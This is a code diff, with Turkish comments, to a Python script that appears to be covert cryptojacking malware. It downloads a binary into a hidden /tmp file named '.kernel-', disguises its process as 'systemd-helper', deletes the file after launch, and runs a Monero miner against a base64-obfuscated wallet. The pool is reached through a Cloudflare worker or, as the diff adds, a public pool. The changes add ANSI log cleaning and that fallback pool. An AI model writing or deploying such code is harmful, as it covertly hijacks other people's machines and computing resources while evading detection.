@@ -9,6 +9,7 @@ import http.server
 import urllib.request
 import json
 import tempfile
+import re
 from urllib.parse import urlparse
 from collections import deque
 
@@ -19,11 +20,18 @@ STATUS = {"running": False, "message": "Sistem Beklemede"}
 CF_WORKER_HOST = ""
 WALLET_ADDR = base64.b64decode("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw=").decode()
 
+# ANSI renk kodlarını temizleme fonksiyonu
+def clean_ansi(text):
+    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
+    return ansi_escape.sub('', text)
+
 def log_to_console(msg):
+    # Gelen mesajdaki ANSI kodlarını temizle
+    clean_msg = clean_ansi(msg)
     timestamp = time.strftime("%H:%M:%S")
-    line = f"[{timestamp}] {msg}"
+    line = f"[{timestamp}] {clean_msg}"
     CONSOLE_LOGS.append(line)
-    print(line)
+    print(line)  # Orijinal haliyle terminale bas (renkli)
 
 def set_process_name(name):
     try: libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
@@ -43,32 +51,38 @@ def execution_logic():
         log_to_console(f"İndirme başarılı. Boyut: {len(binary_content)} bayt.")
         log_to_console("Geçici dosya oluşturuluyor...")
         
-        # Geçici dosya oluştur (varsayılan olarak /tmp altında, diskte ama çoğu container'da tmpfs)
         with tempfile.NamedTemporaryFile(delete=False, dir='/tmp', prefix='.kernel-') as tmp_file:
             tmp_file.write(binary_content)
             tmp_path = tmp_file.name
         
-        os.chmod(tmp_path, 0o755)  # Çalıştırma izni ver
+        os.chmod(tmp_path, 0o755)
         log_to_console(f"Dosya oluşturuldu: {tmp_path}")
         
         log_to_console("Süreç maskeleniyor: systemd-helper")
         set_process_name("systemd-helper")
         
+        # CF_WORKER_HOST kontrolü
+        if not CF_WORKER_HOST:
+            log_to_console("UYARI: CF_WORKER_HOST boş! Varsayılan değer kullanılacak.")
+            pool_host = "pool.supportxmr.com:443"  # örnek bir yedek
+        else:
+            pool_host = f"{CF_WORKER_HOST}:443"
+        
         cmd = [
-            tmp_path, "-o", f"{CF_WORKER_HOST}:443", "-u", WALLET_ADDR,
+            tmp_path, "-o", pool_host, "-u", WALLET_ADDR,
             "-p", f"node-{int(time.time())%1000}", "--keepalive", "--tls",
             "--donate-level=1", "--cpu-max-threads-hint", "50"
         ]
 
         STATUS["running"] = True
         STATUS["message"] = "Sistem Aktif"
-        log_to_console("Madenci başlatılıyor...")
+        log_to_console(f"Madenci başlatılıyor... Havuz: {pool_host}")
 
         # Alt süreci başlat ve çıktılarını oku
-        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                 text=True, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"})
         
-        # Geçici dosyayı silebiliriz, çalışan süreç dosyayı kullanmaya devam eder
+        # Geçici dosyayı silelim
         try:
             os.unlink(tmp_path)
         except:
@@ -77,7 +91,7 @@ def execution_logic():
         # Çıktıları logla
         for line in iter(proc.stdout.readline, ""):
             if line:
-                log_to_console(f"[CORE] {line.strip()}")
+                log_to_console(f"{line.strip()}")
                 
     except Exception as e:
         STATUS["running"] = False
@@ -143,6 +157,7 @@ def run():
     parsed = urlparse(raw_url)
     global CF_WORKER_HOST
     CF_WORKER_HOST = parsed.netloc if parsed.netloc else raw_url.split('/')[0]
+    print(f"CF_WORKER_HOST ayarlandı: {CF_WORKER_HOST}")  # Docker logunda görmek için
     port = int(os.environ.get("PORT", 8080))
     http.server.ThreadingHTTPServer(("0.0.0.0", port), ControlHandler).serve_forever()
 
